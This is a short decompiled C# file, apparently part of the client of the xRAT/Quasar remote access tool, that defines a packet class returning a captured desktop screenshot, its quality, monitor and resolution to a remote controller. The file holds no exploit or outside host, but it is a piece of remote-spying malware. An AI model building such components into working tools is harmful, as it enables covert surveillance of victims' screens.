using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000081 RID: 129
	[Serializable]
	public class GetDesktopResponse : IPacket
	{
		// Token: 0x1700006B RID: 107
		// (get) Token: 0x06000345 RID: 837 RVA: 0x00003938 File Offset: 0x00001B38
		// (set) Token: 0x06000346 RID: 838 RVA: 0x00003940 File Offset: 0x00001B40
		public byte[] Image { get; set; }

		// Token: 0x1700006C RID: 108
		// (get) Token: 0x06000347 RID: 839 RVA: 0x00003949 File Offset: 0x00001B49
		// (set) Token: 0x06000348 RID: 840 RVA: 0x00003951 File Offset: 0x00001B51
		public int Quality { get; set; }

		// Token: 0x1700006D RID: 109
		// (get) Token: 0x06000349 RID: 841 RVA: 0x0000395A File Offset: 0x00001B5A
		// (set) Token: 0x0600034A RID: 842 RVA: 0x00003962 File Offset: 0x00001B62
		public int Monitor { get; set; }

		// Token: 0x1700006E RID: 110
		// (get) Token: 0x0600034B RID: 843 RVA: 0x0000396B File Offset: 0x00001B6B
		// (set) Token: 0x0600034C RID: 844 RVA: 0x00003973 File Offset: 0x00001B73
		public string Resolution { get; set; }

		// Token: 0x0600034D RID: 845 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetDesktopResponse()
		{
		}

		// Token: 0x0600034E RID: 846 RVA: 0x0000397C File Offset: 0x00001B7C
		public GetDesktopResponse(byte[] image, int quality, int monitor, string resolution)
		{
			this.Image = image;
			this.Quality = quality;
			this.Monitor = monitor;
			this.Resolution = resolution;
		}

		// Token: 0x0600034F RID: 847 RVA: 0x000039A1 File Offset: 0x00001BA1
		public void Execute(Client client)
		{
			client.Send<GetDesktopResponse>(this);
		}
	}
}
